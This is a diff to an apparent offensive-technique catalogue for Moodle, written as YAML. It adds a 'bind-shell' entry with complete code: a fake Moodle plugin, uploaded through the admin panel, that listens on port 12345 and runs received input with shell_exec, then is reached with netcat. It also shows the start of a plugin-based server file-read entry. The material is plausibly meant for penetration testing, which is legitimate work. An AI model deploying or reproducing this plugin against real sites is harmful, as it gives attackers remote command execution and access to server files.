@@ -39,6 +39,31 @@ docker:
 
     '
 functions:
+  bind-shell:
+  - code: "# Plugin-based bind shell \u2014 deploy a minimal Moodle plugin via admin\
+      \ panel\nmkdir -p /tmp/local_bs\ncat > /tmp/local_bs/version.php << 'PHP'\n\
+      <?php\n$plugin->version   = 2024020800;\n$plugin->component = 'local_bs';\n\
+      $plugin->requires  = 2022112800;\nPHP\n\ncat > /tmp/local_bs/index.php << 'PHP'\n\
+      <?php\nrequire_once('../../config.php');\nset_time_limit(0);\n$sock = socket_create(AF_INET,\
+      \ SOCK_STREAM, SOL_TCP);\nsocket_set_option($sock, SOL_SOCKET, SO_REUSEADDR,\
+      \ 1);\nsocket_bind($sock, '0.0.0.0', 12345);\nsocket_listen($sock, 1);\n$cli\
+      \ = socket_accept($sock);\nwhile (true) {\n    $data = socket_read($cli, 65536,\
+      \ PHP_NORMAL_READ);\n    if (!$data) break;\n    $out = shell_exec(trim($data));\n\
+      \    socket_write($cli, $out ?? '');\n}\nsocket_close($cli);\nsocket_close($sock);\n\
+      PHP\n\ncd /tmp && zip -r local_bs.zip local_bs/\n# Upload via Site Administration\
+      \ > Plugins > Install plugins\n# Then activate by visiting: http://victim.com/local/bs/index.php\n\
+      # Connect with: nc victim.com 12345\n"
+    comment: |
+      Opens a TCP bind shell on port 12345 via a minimal Moodle plugin using PHP's socket
+      extension. The plugin index.php blocks on socket_accept() until a client connects.
+      Requires PHP's sockets extension (enabled by default on most Moodle hosts).
+      Deploy the same way as the rce plugin entry.
+      Connect with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      admin:
+    platform: linux
+    tty: false
   file-read:
   - code: "# Plugin-based file read \u2014 deploy a plugin that reads server files\n\
       # Plugin index.php:\n<?php\nrequire_once('../../config.php');\n$f = $_REQUEST['f']\
